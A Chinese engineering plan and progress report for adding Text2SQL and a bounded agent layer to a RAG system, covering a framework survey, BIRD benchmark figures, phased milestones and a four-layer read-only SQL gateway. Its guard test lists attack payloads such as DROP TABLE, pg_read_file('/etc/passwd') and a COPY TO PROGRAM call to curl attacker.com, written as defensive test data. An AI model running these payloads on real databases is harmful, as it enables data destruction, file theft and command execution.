| **Vanna.AI** | Text2SQL 库 | DDL + 文档 + 历史 question-SQL 三者向量化，检索后拼 prompt 生成 SQL | 思路与我一致（**反证方向正确**），但自带向量存储，**无法复用我的 Qdrant + bge-m3 + 多租户 ACL** |
| **DB-GPT** | 平台 | 完整 Text2SQL + Agent + 数据应用平台 + Web UI | **替代整个应用**，引入后自研 7848 行成了重复建设 |
| **WrenAI / Dataherald / Chat2DB** | 平台 / 服务 | 独立部署的 Text2SQL 服务与 BI 前端 | ⚠️ 本环境 GitHub 不可达，**未取得一手核实**；定位上均属"替换而非嵌入" |
| **SQLCoder / XiYan-SQL / OmniSQL** | **微调模型** | 专用小模型（7B~32B），BIRD 上 72~76% | 需 GPU 资源；且换本地模型降低演示便利性 |
| **OpenSearch-SQL / CHASE-SQL / Agentar-Scale-SQL** | **方法论** | 多候选生成 + 自一致性投票 + 执行反馈修正 | **借鉴其方法论**，不引入依赖。CHASE-SQL+Gemini 76.02%、Agentar-Scale-SQL 81.67%（[BIRD 榜单](https://bird-bench.github.io/)） |
| **本项目方案** | **自研，嵌入现有架构** | 复用现有 Qdrant 做 schema/示例召回 + 四层 SQL 安全网关 + 有界 Agent 编排 | ✅ **唯一能同时复用现有 RAG 基础设施、多租户 ACL、SSE 契约与测试体系的路线** |

### 🔑 调研最重要的产出（不是"选哪个"，而是"大家怎么做"）

> 调研下来最重要的结论**不是"选哪个框架"，而是"主流做法高度收敛"**：
> Vanna、DB-GPT、CHASE-SQL、XiYan-SQL 的核心**都是同一套**——
> **schema/示例检索（Schema Linking + few-shot）→ LLM 生成 → 执行反馈自修正**。
>
> 也就是说：**Text2SQL 的最佳实践本质上就是一个 RAG 流程**，只是检索对象从"文档片段"
> 变成了"表结构描述 + question-SQL 示例对"。
>
> **因此引入 Text2SQL 不需要引入任何新框架——本项目已有的 Qdrant + bge-m3 + 混合检索
> 基础设施可以直接复用，只是换一份语料去索引。**
> 这把"新增一个技术栈"变成了"复用已有技术栈做一件新事"，
> **显著降低改造风险，也显著提升架构叙事的一致性**。

## 4.7 净新增依赖：只有 2 个

| 依赖 | 版本（✅ 实测） | 许可证 | 用途 |
|---|---|---|---|
| `sqlglot` | **30.21.0** | MIT | SQL AST 白名单校验 + LIMIT 注入。**零依赖纯 Python**，Postgres 属 **Official** 支持级别 |
| `PyJWT` | — | MIT | RBAC（P7） |

`openai` SDK（**2.54.0，已在环境中**）可直接替换手写 SSE。
**不需要** LangChain / LangGraph / LlamaIndex / Vanna / DB-GPT。

## 4.8 BIRD 榜单：给评测目标做客观校准

✅ 一手抓取自 [BIRD 官方 leaderboard](https://bird-bench.github.io/)（2026-10）：

| 参考对象 | BIRD Test EX |
|---|---|
| **人类专家（数据工程师 + 数据库学生）** | **92.96%** |
| 榜首：GrainSQL / 华为 DataGallery-Text2SQL / 腾讯 SiriusAI-SQL | 82.3 / 82.4 / 82.3% |
| 蚂蚁 Agentar-Scale-SQL | 81.67% |
| 京东 JoyDataAgent-SQL | 76.19% |
| Google CHASE-SQL + Gemini | 76.02% |
| 腾讯云 TCDataAgent-SQL | 75.74% |
| 阿里云 XiYan-SQL | 75.63% |
| GPT-5.5-xhigh（单模型） | 72.55% |

**BIRD 规模**（官方）：12,751+ question-SQL 对、95 个大库、总大小 33.4 GB、覆盖 37+ 专业领域。

**结论**：BIRD 的难点（脏数据、外部知识、超大 schema）在本项目**都不存在**——只有 4 张表、
列有中文注释、枚举值已内联。**所以「50 题自建集上 EX ≥ 85%」合理可达，不是虚高**。

## 4.9 ⚠️ 明确标注「未确认」的部分

| 项 | 状态 | 影响 | 建议 |
|---|---|---|---|
| WrenAI / Dataherald / Chat2DB 的许可证与架构细节 | ⚠️ GitHub 不可达 | 低（不采用） | 若对外宣讲需先核实 |
| CSpider / DuSQL 的下载地址与 License | ⚠️ 论文确证存在（CSpider: arXiv:1909.13293；DuSQL 被 arXiv:2103.02227 引用），**下载地址未取到** | 低（自建评测集） | 若要引用榜单需自行核实 |
| 「CHASE 是中文跨域 Text2SQL 数据集」 | ❌ **无法证实**（arXiv 标题检索无对应论文） | — | **不要采信**，疑为命名混淆 |
| 中文 Text2SQL 公开榜单 | ⚠️ 未检索到可达页面 | 低 | 引用 BIRD 国际榜单即可 |
| SiliconFlow 官方是否支持 `tool_choice` | ⚠️ 官方 Body 参数表**未列出**该字段 | **低——已实测可用** | ✅ 实测 `auto` 与缺省均正常；**建议不依赖 `required`** |
| SiliconFlow 流式 tool_calls 官方文档 | ⚠️ 官方 Function Calling 示例全部 `stream=False` | 低 | ✅ **已用真实请求逐帧验证**（见 4.2） |

---
---

# 第五部分 · 完整改造计划（8 阶段 / 18.5 人日）

> **总原则：增量演进，不推倒重来。** 每个阶段结束时项目必须可运行、可演示、可回滚。
> **数据层 DDL 见** → [text2sql-数据层设计.md](text2sql-数据层设计.md)

## 5.1 里程碑总览

> ## 📍 当前进度（最后更新：P6 完成）
>
> | 阶段 | 状态 | 实测结果 |
> |---|---|---|
> | **P0** 基线与护栏 | ✅ 完成 | `scripts/check.ps1` 三级闸口；基线 Recall@5 99.01% / MRR 0.9703 冻结并纳入 git |
> | **P1** 数据层 | ✅ 完成 | `kb_analytics` 库 + `kb_ro` 只读角色 + 4 张业务表；ETL 装载 10042 行；真值自检全通过 |
> | **P2** SQL 安全网关 | ✅ 完成 | 四层防御前两层；**44 条攻击载荷全部拦截**，22 条合法查询全部放行 |
> | **P3** Text2SQL 引擎 | ✅ 完成 | 42 题中文评测集，**EX 100%**、Valid SQL Rate 100%、平均生成次数 1.00 |
> | **P4** Agent 编排 + 事件协议 | ✅ 完成 | 有界状态机（五重防死循环）；事件扩为 10 类且既有 4 类字段冻结 |
> | **P5** 三层混合路由 | ✅ 完成 | 规则层纯函数可穷举单测；跨源问题交 LLM 工具选择 |
> | **P5b** Agent HTTP 路由 | ✅ 完成 | `POST /agent/stream`、`POST /agent/route`；经 nginx 端到端验证通过 |
> | **P6** 前端 Agent 可视化 | ✅ 完成 | 执行轨迹面板 + 通道徽标 + 模式切换；`npm run build` 通过 |
> | **P7** 工程完备性 | ✅ **完成** | ✅ CI + ✅ 外部 API 重试 + ✅ RBAC 脱敏 + ✅ SQL 审计 + ✅ LLM 成本记账 + ✅ 会话竞态修复 + ✅ **trace_id 贯穿** + ✅ **Prometheus 指标** + ✅ **结构化日志** + ✅ **备份** + ✅ **对账** |
> | **P8** 文档收口 | 🟡 按用户要求暂停 | ✅ README 重写（RAG+Text2SQL 双引擎叙事）+ ✅ 经验教训.md（19 条）；⏸️ 面试题扩充、演示视频（用户明确暂不做） |
>
> **RBAC 实测**（P7）：
> | 角色 | `SELECT id, first_name, email, department, salary FROM employees` 的结果 |
> |---|---|
> | `analyst` | `[2592, 'Derek', 'yundt.timmothy@example.com', 'Operations', 179997]` —— 全部可见 |
> | `employee` | `[2592, 'Derek', '***', 'Operations', '***']` —— 敏感列脱敏 |
>
> 审计表同步记录：`('a:employee', True, 3, ['email','salary'])` / `('a:analyst', True, 3, None)`。
> **向后兼容验证**：未配置 `RAG_TENANT_ROLES` 时全部走 `analyst`，脱敏只对非特权角色生效
> ⇒ 不配置就等于没有这个功能，既有部署与全部测试零影响。
>
> **成本记账实测**（P7）：一次 Agent 问答 → 19 次 LLM 调用 / 43501 tokens / 均 2289.5 tokens/次；
> `GET /usage/sql` 报 `total=141 / succeeded=141 / redacted=3 / avg=3.3ms`。
>
> **可观测实测**（P7）：`GET /metrics` 输出 10 个指标的 HELP/TYPE，含
> `rag_agent_runs_total{route="sql",degraded="false"} 1`、
> `rag_llm_tokens_total{scene="text2sql_generate",kind="prompt"} 2276`；
> trace_id 经响应头 `X-Request-ID` 回传并支持上游透传。
>
> **运维实测**（P7）：`python -m app.analytics.reconcile` →
> `missing_in_qdrant=0 / orphan_in_qdrant=0 / missing_on_disk=0 /
> unregistered_on_disk=17（已知状态：批量 CLI 入库不写 documents 表）` → **✅ 一致**；
> `python -m app.analytics.backup` → PG 两库 45KB/266KB + Qdrant 快照清单。
>
> **当前质量门禁**（`scripts/check.ps1 -Full` 全绿）：
> - **659 项单测通过**（改造前 45 项）
> - 检索评测**零回归**：Recall@5 99.01% / MRR 0.9703，与基线**逐题一致**
> - Text2SQL 评测：**EX 100%**（42/42）、Valid SQL Rate 100%、平均生成次数 1.00
> - 改造规模：详见 `git log --oneline baseline-p0..HEAD`（13 个提交）
>
> **最关键的业务验证**：改造前 RAG 对「Sales 与 Engineering 各多少人、差多少」答 **1017**（错 31.8 倍），
> 改造后 Agent 答 **32** 并展示执行的 SQL。

| 阶段 | 内容 | 人日 | 累计 | 里程碑（可演示） |
|---|---|---|---|---|
| **P0** | 基线与护栏 | 0.5 | 0.5 | 一键回归命令可用 |
| **P1** | 数据层建表 + ETL | 2 | 2.5 | **`employees` 表里能查出 1010 和 32** |
| **P2** | 只读 SQL 执行器 + 四层安全 | 2 | 4.5 | 10 类攻击载荷全部被拒 |
| **P3** | Text2SQL 引擎 + 评测集 | 2 | 6.5 | **EX ≥ 85%（50 题）** |
| **P4** | Agent 编排层 + 事件协议 | 3 | 9.5 | 旧前端零改动不崩；新事件可观测 |
| **P5** | 三层混合路由 | 2 | 11.5 | 混合问题（SQL+RAG 联合）能答 |
| **P6** | 前端 Agent 可视化 | 2.5 | 14 | **可录 90 秒演示视频** |
| **P7** | 工程完备性 | 3 | 17 | CI 绿灯 + 成本看板 + RBAC |
| **P8** | 文档与叙事收口 | 1.5 | **18.5** | README / 简历条目定稿 |

**建议节奏**：
- **最小可信版本（MVP）= P0–P4（9.5 人日）**：此时已能演示"统计问题走 SQL 且准确"，**简历核心亮点已成立**。
- **完整版本 = P0–P8（18.5 人日）**：约 4 周业余（每天 3~4h）或 3.5 周全职。

---

## P0 · 基线与护栏（0.5 天）

**目标**：在动任何代码之前，把「什么算没坏」变成可执行命令。**没有这一步，后面 7 个阶段都在裸奔。**

| 动作 | 产物 |
|---|---|
| 固化评测基线 | `python -m eval --retrieval-only` → 存 `output/baseline_v1.json`（当前 Recall@5 99.01% / MRR 0.9703） |
| 固化测试基线 | `pytest -q` → **45 passed** 作为回归红线 |
| 加 `scripts/check.ps1` | 一条命令跑完 pytest + eval + 前端 build |
| 建备份脚本 | `pg_dump` 两个库 → `backups/`（顺手补 C5） |
| 清理旧 collection | 删除 `personal_rag`（1154 点，结构不兼容残留） |
| Git tag | `git tag baseline-p0` |

**验收**：`scripts/check.ps1` 输出「测试 45 通过 / Recall@5 = 99.01%」，与基线一致。
**简历价值**：低。但它是后面所有量化数字的来源，**必须有**。

---

## P1 · 数据层：让数据可以被 SQL 查询（2 天）

> ### ⚠️ 范围声明：**SQL 建表只做 xlsx（后续可扩 CSV），不做 PDF / DOCX / MD**
>
> 先厘清一个容易混淆的点：**SQL 查询不直接读文件**。ETL 只在**入库时执行一次**，把表格转成关系表；
> 之后无论问什么统计问题，SQL 查的都是**数据库里的表**，与原始文件格式无关。
> 所以准确问法是：**"哪些格式的文件能在入库时被可靠地转成表"**。
>
> ✅ 基于源码实测（`loader.py` 的 `metadata["type"]` + `chunking/__init__.py` 的格式路由）：
>
> | 格式 | loader 产出 | 能否建表 | 原因 |
> |---|---|---|---|
> | **xlsx** | `type=sheet`（每 sheet 一张 Markdown 表）+ `type=summary` + pandas 降级 `type=row` | ✅ **能** | **sheet 是天然表边界**；有独立 `chunk_xlsx` 策略 |
> | **csv**（当前不支持） | — | ✅ **易扩** | 与 xlsx 同构，只需加 loader 分支 |
> | **docx** | `type=table`（含 `table_index`/`row_count`/`col_count`） | ⚠️ 暂不做 | 一个 docx 常含**多个异构表**，表名/语义无来源 |
> | **pdf** | `type=table`（pdfplumber / get_tables / dict 三级兜底） | ❌ 不做 | 提取是启发式，**跨页表会截断**；无表名，表边界靠猜 |
> | **md / txt** | `type=markdown` / `type=text` | ❌ 不做 | Markdown 表格是**排版**不是数据集；无类型、无表名 |
>
> **另一个必须知道的障碍**：✅ 源码实测 `loader.py:1415` 把所有单元格 `str()` 化了——
> **类型信息在 loader 里就已丢失**（`datetime`→`"2026-08-02 00:00:00"`、数字→`"179997"`、`None`→`""`）。
> 好消息是可逆性良好（日期/数值都能还原，公式保留计算值正是我们想要的）。
> **实践建议**：**不要改造 loader 去保留类型**（会触碰 1592 行核心文件、影响现有 RAG 与评测基线），
> 而是让 **ETL 直接读原始文件**（`openpyxl.load_workbook(data_only=True)`），
> **与 RAG 通道完全解耦**——两条通道各读同一份文件，互不影响。代价是读两遍，在一次性入库成本里可忽略。
>
> 👉 **完整的能力矩阵、类型可逆性表、表头检测陷阱见** → [text2sql-数据层设计.md §5.0](text2sql-数据层设计.md)

| # | 任务 | 文件 | 验收 |
|---|---|---|---|
| 1.1 | 新建 `kb_analytics` 库 + `kb_ro` 只读角色（第③④层防御） | `backend/migrations/analytics/001_init.sql` | `psql -U kb_ro -c "CREATE TABLE t(x int)"` **必须失败** |
| 1.2 | 建 4 张业务表 + `COMMENT ON` 语义注释 + RLS 策略 | 同上 | `SELECT count(*) FROM employees` = **10000** |
| 1.3 | 元数据表 `analytics_tables` / `analytics_columns`（放 `rag` 库） | Alembic 迁移 | `alembic upgrade head` 通过 |
| 1.4 | ETL：从 xlsx 自动推断类型并装载（`COPY FROM STDIN`，非逐行 INSERT） | `app/analytics/seed.py` | `python -m app.analytics.seed --all` 装载 10042 行 **< 3s** |
| 1.5 | Schema 抽取 + 渲染（prompt 用数据字典，含枚举值内联） | `app/analytics/schema.py` | `render_schema()` 输出含枚举值与中文注释 |

**4 张表与来源**（✅ 实测 schema）：

| table_name | display_name | rows | 来源文件 | 关键列 |
|---|---|---|---|---|
| `employees` | 员工表 | 10000 | `xlsx-sample-large-10000-rows.xlsx` | ID / First Name / Last Name / Email / **Department**(10 类) / Salary / Hire Date |
| `sales` | 销售流水 | 20 | `xlsx-sample-multiple-sheets.xlsx` / sheet Sales | Date / Product / Quantity / Revenue |
| `expenses` | 费用支出 | 15 | 同上 / sheet Expenses | Date / Category / Amount |
| `cabinet_costs` | 橱柜成本明细 | 7 | `cost_data.xlsx` | 项目 / 品牌型号 / 规格用途 / 单价(元) / 数量 / 单位 / 计费方式 / 备注（**中文列名**） |

> ⚠️ **建表陷阱**：`cost_data.xlsx` 的**第 1 行是大标题**、第 2 行才是表头。必须复用
> `loader.py` 已有的表头探测逻辑，并**用 `row_count` 与 pandas 直读结果比对做断言**。

**验收测试**（把第三部分的失败案例变成回归测试）：
```python
# backend/tests/test_analytics_seed.py
def test_employees_department_counts():
    """P1 验收：RAG 答错的题，SQL 必须答对"""
    assert query_scalar("SELECT count(*) FROM employees WHERE department='Sales'") == 1042
    assert query_scalar("SELECT count(*) FROM employees WHERE department='Engineering'") == 1010
    assert query_scalar("SELECT count(*) FROM employees WHERE hire_date >= '2026-01-01'") == 192
```

**简历价值**：⭐⭐⭐ 「把异构 Excel 自动推断 schema 并装载为可查询关系表，含类型推断 / 枚举值内联 / 幂等重灌」

---

## P2 · 只读 SQL 执行器 + 四层安全（2 天）

> **这是整个改造里最能体现工程能力的一块，也是面试最容易被追问的一块。**

### 5.2.1 组件设计

```
app/analytics/
├── guard.py        # ① SQL AST 白名单校验（sqlglot）
├── executor.py     # ② 只读连接池 + 超时 + LIMIT 注入 + 结果封装
├── schema.py       # ③ Schema 语义层（数据字典）
└── errors.py       # 把 DB 报错转成「可回灌给 LLM 的自然语言」
```

### 5.2.2 四层防御（每层都要能说清"为什么不能只靠它"）

| 层 | 实现 | 挡住什么 | 为什么这层单独不够 |
|---|---|---|---|
| **① 应用层 AST 校验** | `sqlglot.parse_one(sql, dialect="postgres")` 遍历语法树：只允许 `Select`；拒绝 `Insert/Update/Delete/Merge/Drop/Create/Alter/Truncate/Grant/Copy`；拒绝多语句；拒绝 `pg_catalog`/`information_schema`；拒绝 `SELECT ... INTO` | LLM 生成的越权语句 | 📄 **sqlglot 官方 FAQ 原文**：*"The parser is intentionally lenient… **SQLGlot is a transpiler, not a validator.** A query that parses successfully may still fail at execution time."*（[来源](https://pypi.org/project/sqlglot/)）——**连官方都否认它是安全边界** |
| **② 事务层** | `SET LOCAL transaction_read_only = on` + `statement_timeout = 5s` + 行数上限 | 漏网的写操作、长查询 DoS | 📄 PostgreSQL 官方自承：*"This is a **high-level notion of read-only that does not prevent all writes to disk**."*（[来源](https://www.postgresql.org/docs/current/sql-set-transaction.html)）——仍有 `nextval()`、临时表等漏网路径 |
| **③ 角色权限** | `GRANT SELECT` only，`ALTER ROLE ... default_transaction_read_only = on` | 任何写企图 | 挡不住"用合法 SELECT 读敏感数据"（如全公司薪资），也挡不住 CPU 打满 |
| **④ 数据隔离** | 独立库 + RLS（`app.tenant_id`）+ 列级脱敏 | 跨租户越权读 | 若应用忘了 `SET`，RLS 会因 `current_setting(...,true)` 返回 NULL 而失效——**必须 fail-closed** |

**选型依据（✅ 已核实）**：`sqlglot 30.21.0`，MIT，**零依赖纯 Python**，Python ≥3.9；
Postgres 属 **Official** 支持级别（与 MySQL/Oracle/Snowflake/Spark 同级）；
核心 API `parse_one` / `find_all(exp.Column|exp.Select|exp.Table)` / `transform()` / `.sql(dialect=)` 已在官方文档确证；
另有 `sqlglot[c]`（mypyc 编译版）提速 3–5×。

**对比 `sqlparse`**（✅ 已核实）：其官方自我定位就是 *"non-validating SQL parser… accepts any input without validating it"*，
无任何访问控制特性；官方 benchmark 显示它比 sqlglot 慢 4–20× 且多项用例 N/A。
**结论：安全校验用 sqlglot，`sqlparse` 只能用于格式化。**

### 5.2.3 关键工程细节（都是会踩的坑）

1. **LIMIT 强制注入**：不要相信 LLM 写 `LIMIT`。用 sqlglot 改写 AST，**强制包一层**：
   ```python
   # 不追加到 SQL 末尾（会与已有 LIMIT 冲突），而是包裹
   guarded = exp.select("*").from_(original.subquery("_q")).limit(max_rows)
   ```
   这样即使 LLM 写了 `LIMIT 999999` 也被外层压住。
2. **超时要设在连接上**，不是 `requests` 层：`SET LOCAL statement_timeout = '5s'`，
   否则 PG 侧仍在跑、连接不释放。
3. **结果行数 + 列数上限**，超限截断并**在响应里标注 `truncated: true`**（让用户知道答案不完整）。
4. **NULL 与类型处理**：`Decimal`/`date` 不能直接 `json.dumps`——统一转字符串，否则 SSE 序列化崩。
5. **报错回灌（reflexion）**：PG 报错（如 `column "dept" does not exist`）是**最高质量的修正信号**，
   原样回灌让 LLM 重写一次。**但最多重试 2 次。**
6. **空结果处理**：`0 rows` 不等于错。要求 LLM 区分「查询没写对」与「真的没有数据」。
7. **RLS 必须 fail-closed**：策略里用 `current_setting('app.tenant_id', true)` 时若应用忘了 `SET`，
   返回 NULL，`tenant_id = NULL` 恒为 NULL → 不匹配任何行（**这其实是安全的**）。
   但若写成 `USING (tenant_id = current_setting(...) OR current_setting(...) IS NULL)` 这类
   "方便调试"的写法，**隔离会静默失效**。→ 策略必须纯粹，且连接初始化时**强制** `SET LOCAL`。
8. **⚠️ 预检只能用 `EXPLAIN`，绝不能用 `EXPLAIN ANALYZE`**：📄 PostgreSQL 官方原文
   *"The `ANALYZE` option causes the statement to be **actually executed**, not only planned"*，
   且 *"other side effects of the statement will happen as usual"*（[来源](https://www.postgresql.org/docs/current/sql-explain.html)）。
   用 `EXPLAIN (FORMAT JSON)` 预检——只做计划不执行，成本极低，却能提前发现列名/类型错误。
   > **这是一个很容易写错且后果严重的点**：写 `EXPLAIN ANALYZE` 等于把用户 SQL 真跑一遍，安全网关形同虚设。
   > 写成单测：断言执行器生成的预检语句**不含 `ANALYZE`**。

### 5.2.4 验收（安全测试必须是攻击性测试）

```python
# backend/tests/test_sql_guard.py  —— 每一条都是真实攻击载荷
MUST_REJECT = [
    "DROP TABLE employees",
    "DELETE FROM employees WHERE 1=1",
    "UPDATE employees SET salary = 999999",
    "SELECT * FROM employees; DROP TABLE employees;",     # 多语句
    "SELECT pg_read_file('/etc/passwd')",                 # 文件读取
    "SELECT * FROM pg_shadow",                            # 系统表
    "CREATE TABLE evil (x int)",                          # DDL
    "SELECT 1 INTO TEMP TABLE t",                         # INTO 写表
    "/*x*/ DELETE /*y*/ FROM employees",                  # 注释混淆
    "COPY employees TO PROGRAM 'curl attacker.com'",      # 命令执行
]
MUST_ALLOW = [
    "SELECT count(*) FROM employees",
    "WITH d AS (SELECT department, count(*) c FROM employees GROUP BY 1) SELECT * FROM d ORDER BY c DESC",
    "SELECT department, avg(salary) FROM employees GROUP BY department HAVING avg(salary) > 100000",
]
```

**验收**：10 条攻击载荷全部被拒；3 条合法查询全部通过；只读角色直连测试写操作失败。

> 🎁 **一个能显著提升测试体验的发现**：sqlglot 自带**纯 Python SQL 执行引擎**
> （`from sqlglot.executor import execute`），可对 Python 字典充当的"表"直接执行 SQL
> （📄 官方原文：*"The engine is not supposed to be fast, but it can be useful for **unit testing**"*，[来源](https://pypi.org/project/sqlglot/)）。
> 这意味着 **`test_sql_guard.py` 与 Text2SQL 单测可以完全不依赖 PostgreSQL**——
> 与本项目既有的 hermetic 测试哲学（45 例毫秒级、不真连外部服务）**完美契合**。
> 真实执行仍走 PostgreSQL，但"SQL 是否正确"可在内存里断言。

**简历价值**：⭐⭐⭐⭐⭐ 「设计四层纵深防御的只读 SQL 执行网关：AST 白名单 + 只读事务 + 角色权限 + RLS，覆盖 10 类攻击载荷；单测用 sqlglot 内存执行引擎实现零外部依赖」

---

## P3 · Text2SQL 引擎（2 天）

### 5.3.1 链路

```
自然语言问题
 ├─ 1. Schema Linking：把相关表塞进 prompt（表多了必须裁剪，用向量/BM25 召回表描述）
 ├─ 2. Few-shot 示例检索：从 question-SQL 样例库召回 top-3（复用 Qdrant）
 ├─ 3. LLM 生成 SQL（function calling 或严格格式输出）
 ├─ 4. Guard 校验（P2）→ 失败则错误回灌重写（≤2 次）
 ├─ 5. EXPLAIN 预检（不执行，成本极低，能提前发现列名/类型错误）
 ├─ 6. 执行（只读 + 超时 + 上限）
 ├─ 7. 结果 → 自然语言摘要（必须附 SQL 与结果表，可解释）
 └─ 8. 落库审计：question / sql / 耗时 / 行数 / 是否重试 / 是否被拒
```

### 5.3.2 三个提升准确率的具体手段

**① Few-shot 示例库（性价比最高）**
建 `analytics_fewshot` 表存 `(question, sql, tables)`，用现有 bge-m3 向量化后**存进现有 Qdrant collection**
（新增 payload 字段 `type=sql_example`）。查询时先召回 top-3 相似问题及其 SQL 塞进 prompt。
> **价值**：把「Text2SQL」和「RAG」两个技术栈**缝合成一个故事**——
> "我用同一套向量检索基础设施，既做文档召回，也做 SQL 示例召回"。面试时这是很强的架构一致性叙事。

**② 枚举值内联 + 大小写归一**
`department` 的 10 个取值写进列注释，prompt 明确要求字符串比较注意大小写。
（✅ 实测证明：给了全枚举值，模型能正确写出 `IN ('Sales','Engineering')`。）

**③ 口径歧义澄清**（✅ 实测模型会主动追问"客单价口径"）
把它产品化：在 `analytics_fewshot` 里标注易歧义指标（客单价、平均薪资、增长率），
prompt 要求遇到这些指标时**先返回 `clarify` 事件而非直接查**。

### 5.3.3 自建 Text2SQL 评测集（**简历关键数字来源**）

扩展现有 `eval` 框架，新增 `--text2sql` 模式：

```jsonl
{"question":"员工表中Sales部门和Engineering部门各有多少人？","gold_sql":"SELECT department, count(*) FROM employees WHERE department IN ('Sales','Engineering') GROUP BY department","check":"result_equals","expected":{"Sales":1042,"Engineering":1010}}
{"question":"2026年入职的员工有多少人？","gold_sql":"SELECT count(*) FROM employees WHERE hire_date >= '2026-01-01'","check":"scalar_equals","expected":192}
{"question":"哪个产品总营收最高？","gold_sql":"SELECT product FROM sales GROUP BY product ORDER BY sum(revenue) DESC LIMIT 1","check":"scalar_equals","expected":"MegaPack"}
```

**指标定义（严格用业界口径，简历上才站得住）**：
- **Execution Accuracy (EX)**：执行生成 SQL 与执行 Gold SQL，**结果集相同**即算对（比字符串匹配合理得多）
- **Valid SQL Rate**：生成 SQL 通过 guard + 成功执行的比例
- **Guard 拦截率**：恶意/越权 SQL 被拦比例
- **自修正成功率**：首次失败后经报错回灌重写成功的比例

**目标：50 题上 EX ≥ 85%**，依据见 4.8 节的 BIRD 榜单校准。

> ### ✅ 实测结果（P3 完成，2026-10-08）
>
> 实际交付 **42 题**中文评测集（`backend/eval/text2sql_dataset.jsonl`），
> 覆盖 18 个类别：基础/条件/去重计数、分组聚合与对比、分组排序、Top-N、
> 聚合求和/平均/极值、日期区间与日期分组、明细查询、子查询、窗口函数、
> 跨表（销售/费用）、中文列名表。
>
> | 指标 | 实测值 | 目标 | 判定 |
> |---|---|---|---|
> | **Execution Accuracy (EX)** | **100.00%**（42/42） | ≥85% | ✅ 超目标 |
> | **Valid SQL Rate** | **100.00%**（42/42） | — | ✅ |
> | **平均生成次数** | **1.00** | — | ✅ 一次生成即正确，自修正链路未被触发 |
> | 澄清触发 | 0 条 | — | 数据集刻意不含歧义题（见下） |
>
> **关键回归断言全部通过**（这些正是改造方案第三部分 RAG 失败的题）：
> - `Sales=1042 / Engineering=1010 / 差值=32` —— 改造前 RAG 答 1017（错 31.8 倍）
> - `2026 年入职=192` / `最高薪 Derek Cummings 179997 Operations`
> - 中文列名表 `cost_data` **4/4 全通过**（验证 `col_N` 标识符方案可用）
>
> ⚠️ **两个必须诚实说明的点**：
> 1. **100% 不等于"比 BIRD 榜首强"**。本项目的表只有 4 张、列有中文注释、
>    枚举值已内联，难度远低于 BIRD（95 库 / 33.4GB / 37 领域，人类专家 92.96%）。
>    这个数字证明的是**"schema 语义层做对了，模型就能稳定生成正确 SQL"**。
> 2. **数据集刻意不含口径歧义题**（如「平均客单价」）。因为歧义题的正确行为是
>    **反问而非执行**，计入 EX 分母会让指标失真。澄清能力由独立测试覆盖：
>    `tests/test_text2sql_ambiguity.py`（23 例双向断言）+ 真实 LLM 验证
>    （「平均客单价是多少？」→ 正确反问并给出两个候选口径；
>      「Sales 部门的平均薪资是多少？」→ 正确直接执行）。
>
> **过程中修正的两个方法学错误**（详见 [经验教训.md](经验教训.md) L-010 / L-011）：
> - **指标本身错**：初版用"结果集严格相等"，把 15 个**语义正确但多返回了识别性列**
>   的答案判成错误（如模型答 `(Operations, Derek, Cummings, 179997)` 而 gold 只要
>   `(Operations,)`）——那是**更好的答案**。改为"期望行被生成行覆盖（子序列匹配）"后
>   EX 从 **57.14% → 100%**。**指标错比模型错更难发现，因为它看起来像"模型不行"。**
> - **歧义检测过度触发**：初版把「平均薪资」一律判为歧义，把
>   「Sales 部门的平均薪资是多少？」这类已说清口径的题也拦下反问。
>   **过度澄清把能答的问题变成答不了，比不澄清更糟。** 触发数从 5 → 1 → 0（数据集侧）。
>
> 复现：`cd backend && python -m eval.text2sql_runner`（约 6 分钟，42 次 LLM 调用）

**验收用真值**（✅ pandas 实测，可直接写进回归测试）：

| 问题 | 期望 SQL 语义 | 真值 |
|---|---|---|
| Sales 与 Engineering 各多少人、差多少？ | `GROUP BY department` | Sales 1042 / Engineering **1010** / 差 **32** |
| 哪个部门人数最多/最少？ | `ORDER BY count` | 最多 Sales 1042 / 最少 Finance 956 |
| 全公司薪资最高的员工？ | `ORDER BY salary DESC LIMIT 1` | Derek Cummings，179997，Operations |
| 2026 年入职多少人？ | `WHERE hire_date >= '2026-01-01'` | **192** |
| 哪个产品总营收最高？ | `SUM(revenue) GROUP BY product` | MegaPack，47044.68 |
| MegaPack 一共卖了多少单位？ | `SUM(quantity) WHERE product=...` | **340** |
| 平均客单价？ | ⚠️ 口径歧义（`AVG(revenue)` vs `SUM(revenue)/SUM(quantity)`） | 5693.416 |

> ⚠️ 最后一行：**「平均客单价」口径本身有歧义**。这类问题必须在 prompt 里显式要求
> 「若口径不唯一，先向用户澄清」——这也是简历上可以写"做了口径澄清机制"的亮点。

**简历价值**：⭐⭐⭐⭐⭐ 「自建 50 题中文 Text2SQL 评测集，以 Execution Accuracy 为口径达 XX%，Valid SQL Rate XX%」

---

## P4 · Agent 编排层（3 天）

### 5.4.1 为什么手写而不引入框架

见 4.5 节的完整对比。**核心三点**：需求面窄（3 工具、上界明确）、必须复用既有 SSE 契约与
hermetic 测试体系、可单测性是核心资产。**同时主动说明切换边界**（多 Agent/HITL → LangGraph；
复杂结构化输出 → Pydantic AI）。

### 5.4.2 Agent Loop 设计（有界，防死循环）

```python
# app/agent/loop.py 骨架
@dataclass
class AgentState:
    question: str
    history: list[dict]
    steps: int = 0
    tool_calls: list[ToolCall] = field(default_factory=list)
    observations: list[Observation] = field(default_factory=list)
    final_answer: str | None = None
    degraded: bool = False          # 是否降级到纯 RAG

class AgentLoop:
    MAX_STEPS = 5                   # 硬上界
    WALL_CLOCK = 60.0               # 墙钟超时（秒）
    MAX_SQL_RETRY = 2
    MAX_LLM_CALLS = 8               # 成本上界

    def run(self, q, history, principal) -> Iterator[Event]:
        deadline = time.monotonic() + self.WALL_CLOCK
        state = AgentState(question=q, history=history)

        # ① 规则前置路由（0 成本，可单测）
        forced = route_by_rules(q)              # -> "sql" | "rag" | None
        while state.steps < self.MAX_STEPS:
            if time.monotonic() > deadline:
                yield Event("degraded", reason="wall_clock"); break
            ...
            # ② LLM 决策（tools=3 个 schema）
            # ③ 执行工具 -> observation
            # ④ 终止条件：LLM 不再请求工具 或 触发上界
        else:
            yield Event("degraded", reason="max_steps")

        # ⑤ 无论怎么结束，都必须给用户答案（降级到纯 RAG 而非报错）
```

**五重防死循环/防失控**（面试必问）：
1. `MAX_STEPS = 5` 硬上界 —— 状态机而非 `while True`
2. `WALL_CLOCK = 60s` 墙钟超时 —— 防单步慢
3. `MAX_LLM_CALLS = 8` —— **成本上界（框架默认往往没有，但生产必须有）**
4. 相同工具 + 相同参数**去重**：连续两次相同调用直接判为循环，跳出
5. 任一步失败 → **降级到纯 RAG**，而不是把错误抛给用户（保证可用性不倒退）

### 5.4.3 工具定义（3 个，别贪多）
